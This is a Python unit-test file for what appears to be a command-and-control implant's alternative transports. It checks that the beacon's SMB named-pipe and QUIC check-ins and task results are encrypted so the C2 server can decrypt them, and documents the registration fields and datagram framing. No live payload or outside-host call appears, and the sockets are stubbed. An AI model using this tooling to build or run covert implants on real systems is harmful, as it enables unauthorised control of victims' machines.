#!/usr/bin/env python3
"""Tests for the beacon's alternative transports and their listeners.

The beacon is the specification for every listener in this package: its
request builders are the only description of the wire format that exists.
So the tests here exercise the real client against the real
`ServerCrypto`, not a mock of either -- a mock would agree with whatever
the code does and prove nothing about the two sides matching.
"""

import base64
import json
import os
import sys
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from software.c2 import beacon as beacon_mod
from software.c2.beacon import Beacon
from software.c2.server import ServerCrypto


def _key_pair():
    """One key, both ends -- the mismatch this repository has paid for twice."""
    raw = os.urandom(32)
    return raw, base64.b64encode(raw).decode()


def _beacon(key_b64, **protocols):
    cfg = {"c2": {"encryption_key": key_b64,
                  "https": {"enabled": False},
                  "dns": {"enabled": False}}}
    cfg["c2"].update(protocols)
    return Beacon(cfg)


class TestTheEncryptContract(unittest.TestCase):
    """`_encrypt(data: dict)` serialises its own argument.

    Given bytes it raised `TypeError` from inside `json.dumps` and the
    caller's `except` discarded it, so three transports never put a byte on
    the wire. Given a `str` it would have serialised a second time and
    produced JSON inside JSON -- no error, and a peer decrypting it would
    get a string where it expected a dict. The type hint said `dict` all
    along; these tests make it true.
    """

    def setUp(self):
        self.raw, self.b64 = _key_pair()
        self.crypto = ServerCrypto(self.raw)

    # ── the contract itself ──

    def test_encrypt_accepts_a_dict(self):
        b = _beacon(self.b64)
        out = b._encrypt({"action": "beacon"})
        self.assertIsInstance(out, str)
        self.assertEqual(self.crypto.decrypt(out), {"action": "beacon"})

    def test_encrypt_refuses_a_str(self):
        b = _beacon(self.b64)
        with self.assertRaises(TypeError) as caught:
            b._encrypt(json.dumps({"action": "beacon"}))
        self.assertIn("dict", str(caught.exception))

    def test_encrypt_refuses_bytes(self):
        b = _beacon(self.b64)
        with self.assertRaises(TypeError) as caught:
            b._encrypt(json.dumps({"action": "beacon"}).encode())
        self.assertIn("dict", str(caught.exception))

    def test_encrypt_refuses_none_and_a_list(self):
        b = _beacon(self.b64)
        for bad in (None, [{"action": "beacon"}], 7):
            with self.subTest(bad=type(bad).__name__):
                with self.assertRaises(TypeError):
                    b._encrypt(bad)

    def test_the_refusal_never_contains_the_value(self):
        # The argument is plaintext about to be encrypted. The message may
        # name the parameter and the type; it may not quote the content.
        b = _beacon(self.b64)
        secret = "sensitive-marker-9f3a1c"
        for bad in (json.dumps({"k": secret}), json.dumps({"k": secret}).encode()):
            with self.subTest(kind=type(bad).__name__):
                with self.assertRaises(TypeError) as caught:
                    b._encrypt(bad)
                self.assertNotIn(secret, str(caught.exception))

    # ── the three call sites, through the real ServerCrypto ──

    def _smb_capture(self, b):
        """Run an SMB path with the socket layer stubbed; return what it wrote."""
        written = []
        return written, (
            patch.object(b, "_smb_connect", return_value=MagicMock()),
            patch.object(b, "_smb_write_pipe",
                         side_effect=lambda sock, data: written.append(data) or True),
            patch.object(b, "_smb_read_pipe", return_value=None),
        )

    def _enter(self, patches):
        for p in patches:
            p.start()
            self.addCleanup(p.stop)

    def test_smb_checkin_payload_round_trips_through_server_crypto(self):
        b = _beacon(self.b64, smb={"enabled": True, "server": "10.0.0.1"})
        written, patches = self._smb_capture(b)
        self._enter(patches)

        b._beacon_smb()

        self.assertEqual(len(written), 1, "the check-in wrote nothing")
        payload = written[0]
        if isinstance(payload, bytes):
            payload = payload.decode()
        got = self.crypto.decrypt(payload)
        self.assertIsInstance(got, dict,
                              "the server decrypted a %s, not a dict"
                              % type(got).__name__)
        self.assertEqual(got["action"], "register")
        # On first contact the implant is identified by "id"; "agent_id" is
        # None until the server assigns one. _system_info() carries both,
        # and HTTPS does exactly the same -- so a listener must key off
        # "id" for a registration, not "agent_id".
        self.assertEqual(got["id"], b._implant_id)
        self.assertIsNone(got["agent_id"])

    def test_smb_result_payload_round_trips(self):
        b = _beacon(self.b64, smb={"enabled": True, "server": "10.0.0.1"})
        written, patches = self._smb_capture(b)
        self._enter(patches)

        b._send_result_smb("task-1", "ok", "uid=0(root)")

        self.assertEqual(len(written), 1, "the result wrote nothing")
        payload = written[0]
        if isinstance(payload, bytes):
            payload = payload.decode()
        got = self.crypto.decrypt(payload)
        self.assertIsInstance(got, dict)
        self.assertEqual(got["action"], "result")
        self.assertEqual(got["task_id"], "task-1")
        self.assertEqual(got["output"], "uid=0(root)")

    def test_quic_payload_round_trips(self):
        b = _beacon(self.b64, quic={"enabled": True, "server": "10.0.0.1:4433"})
        sent = []

        class _FakeUdp:
            def settimeout(self, _):
                pass

            def sendto(self, data, _addr):
                sent.append(data)

            def recvfrom(self, _n):
                raise OSError("no answer in this test")

            def close(self):
                pass

        self._enter((patch.object(beacon_mod.socket, "socket",
                                  side_effect=lambda *a, **k: _FakeUdp()),))

        b._quic_send({"action": "beacon", "agent_id": "probe"})

        self.assertTrue(sent, "the QUIC path sent nothing")
        # Each datagram is [stream_id(4)][frag_index(2)][total_frags(2)]
        # then the chunk -- struct ">IHH", eight bytes, not sixteen.
        frame = b"".join(d[8:] for d in sent)
        # The frame itself is [4-byte big-endian length][payload].
        length = int.from_bytes(frame[:4], "big")
        body = frame[4:4 + length]
        self.assertEqual(len(body), length, "the frame length header lies")
        got = self.crypto.decrypt(body.decode())
        self.assertIsInstance(got, dict)
        self.assertEqual(got["action"], "beacon")
        self.assertEqual(got["agent_id"], "probe")


# New test classes belong above this guard; never append below it.
if __name__ == "__main__":
    unittest.main()
